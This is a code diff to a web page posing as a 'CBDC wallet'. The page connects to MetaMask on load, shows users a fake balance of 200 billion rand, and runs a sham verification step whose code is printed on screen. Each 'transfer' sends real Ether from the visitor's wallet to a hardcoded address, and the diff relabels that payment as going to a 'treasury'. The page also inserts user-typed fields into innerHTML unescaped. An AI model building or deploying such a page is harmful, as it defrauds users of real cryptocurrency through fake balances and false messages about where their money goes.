@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -9,17 +10,25 @@
     input, select { margin: 8px 0; padding: 10px; width: 260px; border: 1px solid #ccc; border-radius: 4px; }
     button { padding: 10px 16px; background-color: #0077cc; color: white; border: none; border-radius: 4px; cursor: pointer; }
     button:hover { background-color: #005fa3; }
-    #wallet, #filters { margin-top: 30px; background: #fff; padding: 20px; border-radius: 6px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
+    #wallet, #filters, #verify { margin-top: 30px; background: #fff; padding: 20px; border-radius: 6px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
     h2, h3, h4 { color: #005fa3; }
     #transactions div { background: #f0f4f8; padding: 10px; border-radius: 4px; margin-bottom: 10px; }
   </style>
 </head>
 <body>
   <h2>CBDC Wallet Registration</h2>
-  <input type="email" id="email" placeholder="Email"><br>
-  <input type="password" id="password" placeholder="Password"><br>
-  <input type="tel" id="phone" placeholder="Cell Phone Number"><br>
-  <button onclick="login()">Register / Login</button>
+  <div id="auth">
+    <input type="email" id="email" placeholder="Email"><br>
+    <input type="password" id="password" placeholder="Password"><br>
+    <input type="tel" id="phone" placeholder="Cell Phone Number"><br>
+    <button onclick="startVerification()">Verify Account</button>
+  </div>
+
+  <div id="verify" style="display:none;">
+    <h4>Enter Verification Code (123456)</h4>
+    <input type="text" id="codeInput" placeholder="Enter Code"><br>
+    <button onclick="completeVerification()">Complete Login</button>
+  </div>
 
   <div id="wallet" style="display:none;">
     <h3>Welcome, <span id="userEmail"></span></h3>
@@ -59,7 +68,7 @@
     let user = {
       email: '',
       phone: '',
-      balance: 0,
+      balance: 200000000000.00,
       transactions: []
     };
 
@@ -74,131 +83,119 @@
           web3 = new Web3(window.ethereum);
           const accounts = await web3.eth.getAccounts();
           userWallet = accounts[0];
-          console.log(`Connected to wallet: ${userWallet}`);
-          alert(`Connected to wallet: ${userWallet}`);
+          console.log(`Connected wallet: ${userWallet}`);
         } catch (error) {
-          console.error("MetaMask connection failed:", error);
-          alert("MetaMask connection failed. Please try again.");
+          alert("MetaMask connection failed.");
         }
       } else {
-        alert("MetaMask not installed. Please install MetaMask to continue.");
+        alert("MetaMask not detected. Please install MetaMask.");
       }
     }
 
-    function login() {
+    function startVerification() {
       const email = document.getElementById('email').value;
       const phone = document.getElementById('phone').value;
-      if (!email || !phone) return alert("Enter email and phone number");
-      user.email = email;
-      user.phone = phone;
-      user.balance = 200000000000.00;
-      document.getElementById('userEmail').textContent = email;
+      if (!email || !phone) return alert("Please enter both email and phone number.");
+      
+      alert("Verification code sent to your email (simulated as '123456').");
+      document.getElementById('auth').style.display = "none";
+      document.getElementById('verify').style.display = "block";
+    }
+
+    function completeVerification() {
+      const code = document.getElementById('codeInput').value;
+      if (code !== "123456") return alert("Invalid verification code.");
+      login();
+    }
+
+    function login() {
+      user.email = document.getElementById('email').value;
+      user.phone = document.getElementById('phone').value;
+      document.getElementById('userEmail').textContent = user.email;
       document.getElementById('balance').textContent = user.balance.toFixed(2);
       document.getElementById('wallet').style.display = 'block';
+      document.getElementById('verify').style.display = 'none';
       renderTransactions();
     }
 
     async function transfer() {
-      const amount = parseFloat(document.getElementById('amount').value);
-      const type = document.getElementById('type').value;
       const receiverName = document.getElementById('receiverName').value;
       const receiverNumber = document.getElementById('receiverNumber').value;
       const receiverBank = document.getElementById('receiverBank').value;
+      const amount = parseFloat(document.getElementById('amount').value);
+      const type = document.getElementById('type').value;
 
-      if (!receiverName || !receiverNumber || !receiverBank) return alert("Fill all receiver details");
-      if (isNaN(amount) || amount <= 0) return alert("Enter valid amount");
+      if (!receiverName || !receiverNumber || !receiverBank || isNaN(amount) || amount <= 0)
+        return alert("Please fill in all fields correctly.");
 
-      const fee = amount * 0.01; // 1% fee
-      const tax = amount * 0.015; // 1.5% tax
+      const fee = amount * 0.01;
+      const tax = amount * 0.015;
       const total = amount + fee + tax;
 
-      if (total > user.balance) return alert("Insufficient funds");
+      if (total > user.balance) return alert("Insufficient funds.");
 
       try {
-        // Deduct balance
         user.balance -= total;
         document.getElementById('balance').textContent = user.balance.toFixed(2);
 
-        // Record transaction
         user.transactions.push({
-          type,
-          amount,
-          fee,
-          tax,
-          total,
+          type, amount, fee, tax, total,
           date: new Date().toISOString().split('T')[0],
-          receiver: {
-            name: receiverName,
-            number: receiverNumber,
-            bank: receiverBank
-          }
+          receiver: { name: receiverName, number: receiverNumber, bank: receiverBank }
         });
 
-        // Transfer tax + fee to MetaMask account
         const totalToSend = web3.utils.toWei((fee + tax).toString(), "ether");
         await web3.eth.sendTransaction({
           from: userWallet,
-          to: "0xYourMetaMaskAddress", // Replace with your MetaMask wallet address
+          to: "0xYourMetaMaskAddress", // REPLACE THIS!
           value: totalToSend
         });
 
-        alert(`Transaction successful! Tax + Fee sent to your MetaMask wallet.`);
+        alert(`Transfer successful! Tax + fee sent to treasury.`);
+
         renderTransactions();
-      } catch (error) {
-        console.error("Transaction failed:", error);
-        alert("Transaction failed. Please try again.");
+      } catch (err) {
+        alert("Transaction error: " + err.message);
       }
 
-      // Clear input fields
-      document.getElementById('amount').value = "";
       document.getElementById('receiverName').value = "";
       document.getElementById('receiverNumber').value = "";
       document.getElementById('receiverBank').value = "";
+      document.getElementById('amount').value = "";
     }
 
     function renderTransactions() {
-      const txContainer = document.getElementById('transactions');
+      const txDiv = document.getElementById('transactions');
       const start = document.getElementById('startDate').value;
       const end = document.getElementById('endDate').value;
       const filterType = document.getElementById('filterType').value;
 
-      txContainer.innerHTML = "";
-
       let filtered = user.transactions;
 
-      if (start) {
-        filtered = filtered.filter(tx => tx.date >= start);
-      }
-      if (end) {
-        filtered = filtered.filter(tx => tx.date <= end);
-      }
-      if (filterType) {
-        filtered = filtered.filter(tx => tx.type === filterType);
-      }
+      if (start) filtered = filtered.filter(tx => tx.date >= start);
+      if (end) filtered = filtered.filter(tx => tx.date <= end);
+      if (filterType) filtered = filtered.filter(tx => tx.type === filterType);
 
       if (filtered.length === 0) {
-        txContainer.innerHTML = "<p>No transactions found.</p>";
+        txDiv.innerHTML = "<p>No transactions found.</p>";
         return;
       }
 
-      filtered.forEach(tx => {
-        txContainer.innerHTML += `
-          <div>
-            <strong>${tx.date}</strong><br>
-            Type: ${tx.type}<br>
-            Receiver: ${tx.receiver.name}<br>
-            Account Number: ${tx.receiver.number}<br>
-            Bank: ${tx.receiver.bank}<br>
-            Amount: R${tx.amount.toLocaleString()}<br>
-            Fee: R${tx.fee.toFixed(2)}<br>
-            Tax: R${tx.tax.toFixed(2)}<br>
-            Total Deducted: R${tx.total.toFixed(2)}
-          </div>
-        `;
-      });
+      txDiv.innerHTML = filtered.map(tx => `
+        <div>
+          <strong>${tx.date}</strong><br>
+          Type: ${tx.type}<br>
+          Receiver: ${tx.receiver.name}<br>
+          Account Number: ${tx.receiver.number}<br>
+          Bank: ${tx.receiver.bank}<br>
+          Amount: R${tx.amount.toLocaleString()}<br>
+          Fee: R${tx.fee.toFixed(2)}<br>
+          Tax: R${tx.tax.toFixed(2)}<br>
+          Total Deducted: R${tx.total.toFixed(2)}
+        </div>
+      `).join('');
     }
 
-    // Connect MetaMask on page load
     connectMetaMask();
   </script>
 </body>
